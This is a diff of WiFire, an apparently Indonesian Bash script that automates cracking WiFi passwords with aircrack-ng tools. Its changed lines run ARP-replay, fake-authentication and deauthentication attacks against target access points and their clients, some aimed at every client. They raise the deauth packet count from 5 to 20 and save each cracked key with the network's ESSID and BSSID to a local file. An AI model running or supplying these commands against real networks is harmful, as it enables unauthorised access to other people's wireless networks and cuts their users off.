@@ -2,7 +2,7 @@
 
 ####################################################
 # (C)opyright blusp10it                            #
-# WiFire v 0.1                                     #
+# WiFire v 0.1 RC2                                 #
 # Baca README terlebih dulu (=                     #
 ####################################################
 
@@ -111,7 +111,7 @@ function tampil() {
       keluaran=""
       if [ "$1" == "aksi" ] ; then keluaran="\e[01;32m[*]\e[00m" ; fi
       if [ "$1" == "info" ] ; then keluaran="\e[01;33m[i]\e[00m" ; fi
-      if [ "$1" == "error" ] ; then keluaran="\e[01;31m[-]\e[00m" ; fi
+      if [ "$1" == "error" ] ; then keluaran="\e[01;31m[!]\e[00m" ; fi
       keluaran="$keluaran $2"
       echo -e "$keluaran"
       if [ "$3" == "true" ] ; then
@@ -338,7 +338,7 @@ if [ "$mode" == "crack" ] ; then
       tampil aksi "Attack (ARPReplay+Deauth): $client" 
       aksi "aireplay-ng (arpreplay)" "aireplay-ng --arpreplay -e \"$essid\" -b $bssid -h $client $monitorInterface"   "true" "0|195|10" & 
       sleep 2
-      aksi "aireplay-ng (deauth)" "aireplay-ng --deauth 5 -e \"$essid\" -a $bssid -c $fakeMac $monitorInterface" "true"
+      aksi "aireplay-ng (deauth)" "aireplay-ng --deauth 20 -e \"$essid\" -a $bssid -c $fakeMac $monitorInterface" "true"
       sleep 2
       if [ "$client" == "$mac" ] ; then sleep 20 && aksi "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $fakeMac $monitorInterface" "true" ; fi
       sleep 60
@@ -357,11 +357,11 @@ if [ "$mode" == "crack" ] ; then
             if [ "$loop" != "0" ] ; then cariClient $encryption ; fi
             sleep 2
             if [ "" != "0" ] || [ "" == "true" ] || [ "$debug" == "true" ] ; then tampil aksi "Attack (Deauth): $client"  ; fi
-            aksi "aireplay-ng" "aireplay-ng --deauth 5 -a $bssid -c $client mon0" "true"
+            aksi "aireplay-ng" "aireplay-ng --deauth 20 -a $bssid -c $client mon0" "true"
             loop="1"
          else
             if [ "" != "0" ] || [ "" == "true" ] || [ "$debug" == "true" ] ; then tampil aksi "Attack (Deauth): *semua client*" ; fi
-            aksi "aireplay-ng" "aireplay-ng --deauth 5 -a $bssid mon0" "true"
+            aksi "aireplay-ng" "aireplay-ng --deauth 20 -a $bssid mon0" "true"
             loop="2"
          fi
          sleep 1
@@ -381,10 +381,15 @@ if [ "$mode" == "crack" ] ; then
    if [ -e "/tmp/WiFire.key" ] ; then
       key=$(cat /tmp/WiFire.key)
       tampil info "WiFi key: $key"
-      echo -en "[~] Key, ditemukan. Apakah kamu ingin mengkoneksikan ke Wireless [y/n] ? "
+      echo -e "-----KEY FOUND-----
+ESSID = $essid
+BSSID = $bssid
+  KEY = $key" >> $(pwd)/WiFire.key
+      echo -e "\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x53\x63\x72\x69\x70\x74\x20\x62\x79\x20\x62\x6c\x75\x73\x70\x31\x30\x69\x74\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a" | awk '{printf "%s\n", $_}' >> $(pwd)/WiFire.key
+      echo -en "[~] Key, ditemukan. Apakah kamu ingin mencoba kevalidan key [Y/n] ? "
       read commit
-      if [ $commit == "y" ] ; then plus="true"
-      elif [ $commit == "n" ] ; then plus = "false"
+      if [[ $commit =~ ^[Yy""]$ ]] ; then plus="true"
+      elif [[ $commit =~ ^[Nn]$ ]] ; then plus = "false"
       else
           tampil error "Pilihan tidak valid!!!"
           return 0
